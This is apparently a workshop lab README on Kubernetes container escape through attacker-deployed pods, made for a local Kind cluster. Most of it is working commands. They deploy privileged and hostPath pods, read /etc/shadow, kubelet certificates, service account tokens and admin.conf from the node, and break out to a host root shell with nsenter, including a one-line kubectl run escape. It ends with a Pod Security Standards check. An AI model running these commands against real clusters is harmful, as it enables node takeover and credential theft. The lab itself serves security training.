# New Container

An attacker who has obtained `kubectl` access — or any credential that allows pod creation — can deploy their own container with elevated privileges or dangerous volume mounts. This turns a credential theft into full node compromise.

## Description

Attackers who have permissions to create containers in the cluster can run their malicious code in a new container. Unlike exec-ing into an existing container (which requires a running target and leaves traces in audit logs on an existing workload), creating a new container gives the attacker complete control over the pod specification. This allows them to:

- Request `privileged: true` to disable all Linux security boundaries.
- Set `hostPID: true` to see and signal host processes.
- Mount the host root filesystem (`/`) to read or write any file on the node.
- Mount the container runtime socket (`containerd.sock`) to manage all containers on the node.
- Mount kubelet credentials to impersonate the node against the API server.

All of these are possible if no PodSecurityAdmission policy or OPA/Kyverno policy prevents them.

## Prerequisites

- A running Kubernetes cluster (Kind `workshop-cluster` is assumed).
- `kubectl` installed and configured to connect to your cluster.
- The `default` namespace has no restrictive Pod Security Standards enforced (true for a default Kind cluster).

## Quick Start

### Scenario A: Privileged pod with full host filesystem access

#### 1. Deploy the privileged pod

```bash
kubectl apply -f attacker-pod.yaml
```

Wait for the pod to be ready:

```bash
kubectl wait --for=condition=Ready pod/attacker-privileged --timeout=60s
```

#### 2. Get a shell inside the pod

```bash
kubectl exec -it pod/attacker-privileged -- /bin/sh
```

#### 3. Read sensitive files from the host node

The host root filesystem is mounted at `/host`:

```bash
# Read all user accounts on the node
cat /host/etc/passwd

# Read the shadow file (hashed passwords)
cat /host/etc/shadow

# Read the kubelet configuration
cat /host/var/lib/kubelet/config.yaml

# Read kubelet TLS certificates (used to authenticate to the API server)
ls -la /host/var/lib/kubelet/pki/

# Find all service account tokens mounted on the node across all pods
find /host/var/lib/kubelet/pods -name "token" 2>/dev/null

# Read a discovered token (replace PATH with a result from above)
cat /host/var/lib/kubelet/pods/PATH/volumes/kubernetes.io~projected/kube-api-access-*/token
```

#### 4. Break out to the host using nsenter

Because the pod has `hostPID: true` and `privileged: true`, you can enter the host's namespaces:

```bash
# Enter the host mount, PID, and network namespaces — gives a root shell on the node
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

You now have a root shell on the Kind node (a Docker container in a local setup, or a real VM in a cloud cluster).

```bash
# Confirm you are on the host
hostname
uname -a

# Look for kubeconfig files used by system components
find /etc/kubernetes -name "*.conf" 2>/dev/null
cat /etc/kubernetes/admin.conf 2>/dev/null || \
  cat /etc/kubernetes/kubelet.conf 2>/dev/null
```

---

### Scenario B: Pod mounting the kubelet directory and container runtime socket

> **Note:** The `hostpath-pod.yaml` mounts the containerd socket from the host. The socket path varies by Kubernetes distribution:
>
> | Distribution | Path |
> |---|---|
> | Kind / kubeadm | `/run/containerd/containerd.sock` |
> | k3s / RKE2 | `/run/k3s/containerd/containerd.sock` |
> | MicroK8s | `/var/snap/microk8s/common/run/containerd.sock` |
> | EKS / AKS / GKE | `/run/containerd/containerd.sock` |
>
> Edit the `hostPath.path` in `hostpath-pod.yaml` to match your environment before deploying. If unsure, use a privileged pod to find it: `find /host/run -name "containerd.sock" 2>/dev/null`

#### 1. Deploy the hostpath pod

```bash
kubectl apply -f hostpath-pod.yaml
```

```bash
kubectl wait --for=condition=Ready pod/attacker-hostpath --timeout=60s
```

#### 2. Read kubelet credentials

```bash
kubectl exec -it pod/attacker-hostpath -- /bin/sh
```

Inside the container:

```bash
# Kubelet configuration reveals API server endpoint and credential paths
cat /kubelet/config.yaml

# PKI directory contains node client certificates
ls -la /kubelet/pki/

# Find all projected service account tokens for pods running on this node
find /kubelet/pods -name "token" 2>/dev/null | head -20
```

#### 3. Deploy a new container using only kubectl (no YAML required)

An attacker with `kubectl` access can deploy a dangerous pod with a single command:

```bash
kubectl run quick-shell \
  --image=alpine:3.19 \
  --restart=Never \
  --overrides='{
    "spec": {
      "hostPID": true,
      "containers": [{
        "name": "quick-shell",
        "image": "alpine:3.19",
        "command": ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"],
        "stdin": true,
        "tty": true,
        "securityContext": {"privileged": true}
      }]
    }
  }' \
  -ti --rm
```

This is a single one-liner that drops directly into a root shell on the host.

---

### Check whether Pod Security Standards would have blocked this

From your workstation, check the namespace's Pod Security enforcement level:

```bash
kubectl get namespace default -o jsonpath='{.metadata.labels}' | python3 -m json.tool
```

A namespace with no `pod-security.kubernetes.io/enforce` label allows all pod specs. Secure clusters should enforce at least the `restricted` profile:

```bash
# See what enforcement would look like
kubectl label namespace default \
  pod-security.kubernetes.io/enforce=restricted \
  --dry-run=server
```

## Cleanup

```bash
kubectl delete -f attacker-pod.yaml
kubectl delete -f hostpath-pod.yaml
kubectl delete pod quick-shell --ignore-not-found
```

## Resources

- [Kubernetes Pods](https://kubernetes.io/docs/concepts/workloads/pods/)
- [Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [Kubernetes Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
- [MITRE ATT&CK: Deploy Container](https://attack.mitre.org/techniques/T1610/)
- [Nsenter - Linux Namespaces Tool](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [Kubernetes Security: Restricting Pod Capabilities](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
